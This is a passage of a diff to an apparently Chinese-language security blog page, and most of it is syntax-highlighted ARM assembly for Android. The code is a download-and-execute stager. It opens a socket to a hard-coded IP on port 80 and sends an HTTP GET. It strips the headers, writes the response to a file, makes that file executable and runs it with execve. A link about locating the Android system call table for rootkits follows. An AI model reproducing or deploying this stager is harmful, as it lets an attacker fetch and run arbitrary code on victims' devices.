+</span><span style="color:#82aaff;">  @跳过http头
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r3</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
+</span><span style="color:#82aaff;">  adr r6</span><span>, </span><span style="color:#82aaff;">nrnr
+</span><span style="color:#82aaff;">  ldr r6</span><span>, [</span><span style="color:#82aaff;">r6</span><span>]
+</span><span style="color:#82aaff;">L2:
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">sub </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#f78c6c;">sp
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">r5
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">3
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">push </span><span style="color:#82aaff;">{r3}
+</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">len = read(sock</span><span>, </span><span style="color:#82aaff;">buf</span><span>, </span><span style="color:#f78c6c;">252</span><span style="color:#82aaff;">)
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">pop </span><span style="color:#82aaff;">{r3}
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">cmp </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
+</span><span style="color:#82aaff;">  ble L7
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
+</span><span style="color:#82aaff;">L3:
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">lsl </span><span style="color:#82aaff;">r3</span><span>, </span><span style="color:#82aaff;">r3</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">8
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#f78c6c;">sp
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">r2
+</span><span style="color:#82aaff;">  ldrb r1</span><span>, [</span><span style="color:#82aaff;">r1</span><span>]
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r3</span><span>, </span><span style="color:#82aaff;">r3</span><span>, </span><span style="color:#82aaff;">r1
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">1
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">cmp </span><span style="color:#82aaff;">r3</span><span>, </span><span style="color:#82aaff;">r6
+</span><span style="color:#82aaff;">  beq L4
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">cmp </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">r0
+</span><span style="color:#82aaff;">  bne L3
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252
+</span><span style="color:#82aaff;">  b L2
+</span><span style="color:#82aaff;">L4:
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#f78c6c;">sp
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">r2
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">sub </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">r2
+</span><span style="color:#82aaff;">  b L6
+</span><span style="color:#82aaff;">  @写入文件
+</span><span style="color:#82aaff;">L5:
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">sub </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#f78c6c;">sp
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">r5
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">3
+</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">len = read(sock</span><span>, </span><span style="color:#82aaff;">buf</span><span>, </span><span style="color:#f78c6c;">252</span><span style="color:#82aaff;">)
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">cmp </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
+</span><span style="color:#82aaff;">  ble L7
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">r0  
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#f78c6c;">sp
+</span><span style="color:#82aaff;">L6:  
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">r4
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">4
+</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@write(fd</span><span>, </span><span style="color:#82aaff;">buf</span><span>, </span><span style="color:#82aaff;">len)
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252
+</span><span style="color:#82aaff;">  b L5
+</span><span style="color:#82aaff;">L7:
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">r5
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">6 
+</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@close(sock)
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">r4
+</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@close(fd)
+</span><span style="color:#82aaff;">  @执行文件
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0x1C
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">lsl </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">4 </span><span style="color:#82aaff;">@S_IRUSR|S_IWUSR|S_IXUSR
+</span><span style="color:#82aaff;">  adr r0</span><span>, </span><span style="color:#82aaff;">name
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">15
+</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@chmod(name</span><span>, </span><span style="color:#82aaff;">S_IRUSR|S_IWUSR|S_IXUSR)
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">push </span><span style="color:#82aaff;">{r1}
+</span><span style="color:#82aaff;">  adr r0</span><span>, </span><span style="color:#82aaff;">name
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">push </span><span style="color:#82aaff;">{r0} @argv</span><span>[</span><span style="color:#f78c6c;">0</span><span>]
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#f78c6c;">sp </span><span style="color:#82aaff;">@argv
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">11
+</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@execve(name</span><span>, </span><span style="color:#82aaff;">argv</span><span>, </span><span style="color:#82aaff;">NULL)
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">1
+</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@exit(</span><span style="color:#f78c6c;">0</span><span style="color:#82aaff;">)
+</span><span style="color:#82aaff;">addr:
+</span><span style="color:#82aaff;">  .short </span><span style="color:#f78c6c;">2 </span><span style="color:#82aaff;">@AF_INET
+</span><span style="color:#82aaff;">  .ascii </span><span style="color:#c3e88d;">&quot;\x00\x50&quot; </span><span style="color:#82aaff;">@port
+</span><span style="color:#82aaff;">  .byte </span><span style="color:#f78c6c;">202</span><span>, </span><span style="color:#f78c6c;">120</span><span>, </span><span style="color:#f78c6c;">2</span><span>, </span><span style="color:#f78c6c;">102 </span><span style="color:#82aaff;">@</span><span style="color:#f78c6c;">ip
+</span><span style="color:#82aaff;">  .zero </span><span style="color:#f78c6c;">8
+</span><span style="color:#82aaff;">head:
+</span><span style="color:#82aaff;">  .ascii </span><span style="color:#c3e88d;">&quot;GET /&quot;
+</span><span style="color:#82aaff;">  .ascii </span><span style="color:#c3e88d;">&quot;&quot; </span><span style="color:#82aaff;">@file
+</span><span style="color:#82aaff;">  .ascii </span><span style="color:#c3e88d;">&quot; HTTP/1.1\r\n&quot;
+</span><span style="color:#82aaff;">  .ascii </span><span style="color:#c3e88d;">&quot;HOST: &quot;
+</span><span style="color:#82aaff;">  .ascii </span><span style="color:#c3e88d;">&quot;www.android.com&quot; </span><span style="color:#82aaff;">@host
+</span><span style="color:#82aaff;">  .ascii </span><span style="color:#c3e88d;">&quot;\r\n\r\n\x00&quot;
+</span><span style="color:#82aaff;">  .zero </span><span style="color:#f78c6c;">2
+</span><span style="color:#82aaff;">name:
+</span><span style="color:#82aaff;">  .asciz </span><span style="color:#c3e88d;">&quot;xxx&quot;
+</span><span style="color:#82aaff;">nrnr:
+</span><span style="color:#82aaff;">  .ascii </span><span style="color:#c3e88d;">&quot;\n\r\n\r&quot;
+</span></code></pre>
+<p>
     Here for howto get system call table:</p>
 <p>
     <a href="https://viaforensics.com/mobile-security/syscalltable-android-playing-rootkits.html">https://viaforensics.com/mobile-security/syscalltable-android-playing-rootkits.html</a></p>
@@ -459,7 +459,7 @@
   
     <div class="post-tags">
     
-      <!-- <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all&#x2F;">#all</a> -->
+      <!-- <a href="https://xjump.me/tags/all/">#all</a> -->
     
     </div>
   
